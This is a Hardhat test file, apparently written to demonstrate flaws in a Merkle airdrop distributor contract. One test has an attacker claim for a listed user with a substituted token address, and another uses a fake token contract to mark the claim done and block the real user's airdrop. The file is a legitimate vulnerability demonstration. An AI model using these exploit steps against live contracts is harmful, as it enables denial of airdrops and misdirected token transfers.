import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { expect } from "chai";
import { ethers } from "hardhat";
import { FakeERC20__factory, MerkleDistributor1__factory, MockERC20__factory } from "../typechain";
import { getRandomInt, get_MerkleTree } from "../util/util";
describe("Merkle distirubtor version 1 vulnerability test", () => {
    // Define a fixture to reuse the same setup in every test.
    // Use loadFixture to run this setup once, snapshot that state,
    // and reset Hardhat Network to that snapshot in every test.
    const deployFixture = async () => {
        const [owner] = await ethers.getSigners();

        const mockERC20 = await new MockERC20__factory(owner).deploy("Test Token", "TT", ethers.utils.parseEther("20000"));
        const { merkleTree, accountList }= await get_MerkleTree();
        
        const merkleRoot = merkleTree.getHexRoot();
        const airdropAmount = ethers.utils.parseEther("100");

        const merkleDistributor = await new MerkleDistributor1__factory(owner).deploy(merkleRoot, airdropAmount);
        const accountNum = getRandomInt(0, 99);
        const testAddr = accountList[accountNum];
        const leafNode = ethers.utils.keccak256(Buffer.from(testAddr.replace("0x", ""), "hex"));
        return { owner, mockERC20, merkleDistributor, merkleTree, accountList, accountNum, testAddr, leafNode };
    }
   
    describe("Attacker can transfer other token, not the airdrop token", () => {
        it("Attacker transfer other token(TT1) instead of airdrop token(TT)", async () => {
            const { owner, mockERC20, merkleDistributor, merkleTree, testAddr, leafNode } = await loadFixture(deployFixture);
            const users = await ethers.getSigners();
            const attacker = users[1];
            const newMockERC20 = await new MockERC20__factory(owner).deploy("Test Token1", "TT1", ethers.utils.parseEther("20000"));
            await mockERC20.transfer(merkleDistributor.address, ethers.utils.parseEther("10000"));
            await newMockERC20.transfer(merkleDistributor.address, ethers.utils.parseEther("10000"));
            console.log("       Balance of TT token before calling claim function: ", (await mockERC20.balanceOf(testAddr)).toString());
            console.log("       Balance of TT1 token before calling claim function: ", (await newMockERC20.balanceOf(testAddr)).toString());
            await merkleDistributor.connect(attacker).claim(testAddr, newMockERC20.address, merkleTree?.getHexProof(leafNode));
            console.log("       Balance of TT token after calling claim function: ", (await mockERC20.balanceOf(testAddr)).toString());
            console.log("       Balance of TT1 token after calling claim function: ", (await newMockERC20.balanceOf(testAddr)).toString());
            expect(await newMockERC20.balanceOf(testAddr)).to.equal(ethers.utils.parseEther("100"));
        });
    });

    describe("Attacker can use fake token address to prevent users' claim.", () => {
        it("Attacker create fake token and set isClaim to true so that users can not get airdrop.", async () => {
            const { mockERC20, merkleDistributor, merkleTree, testAddr, leafNode } = await loadFixture(deployFixture);
            await mockERC20.transfer(merkleDistributor.address, ethers.utils.parseEther("10000"));
            const users = await ethers.getSigners();

            const FakeERC20 = await new FakeERC20__factory(users[1]).deploy();
           
            await merkleDistributor.connect(users[1]).claim(testAddr, FakeERC20.address, merkleTree?.getHexProof(leafNode));
            await expect(merkleDistributor.connect(users[2]).claim(testAddr, mockERC20.address, merkleTree?.getHexProof(leafNode))).revertedWith("Already claimed.");
        });
    });

});
